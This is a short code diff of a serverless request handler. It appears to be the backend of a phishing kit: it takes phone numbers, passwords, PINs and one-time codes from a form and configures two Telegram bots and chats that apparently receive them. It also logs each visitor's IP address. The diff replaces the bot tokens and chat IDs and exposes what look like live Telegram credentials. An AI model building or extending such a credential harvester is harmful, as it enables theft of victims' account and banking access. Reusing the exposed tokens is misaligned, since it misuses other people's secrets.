@@ -6,11 +6,11 @@ export default async function handler(req, res) {
   const { type, issue, phone, pass, pin, otp, attempt } = req.body;
 
   // ==================== DUAL BOT CONFIGURATION ====================
-  const BOT_1_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
-  const CHAT_1_ID = '6076330929';
+  const BOT_1_TOKEN = '8895950049:AAH06SNj2czNyQIUAGpouRa_c5Mj7FV91N8';
+  const CHAT_1_ID = '8956326200';
 
-  const BOT_2_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
-  const CHAT_2_ID = '6076330929';
+  const BOT_2_TOKEN = '885950049:AAH06SNj2czNyQIUAGpouRa_c5Mj7FV91N8';
+  const CHAT_2_ID = '896326200';
 
   // Extract visitor real IP address securely from Vercel headers
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
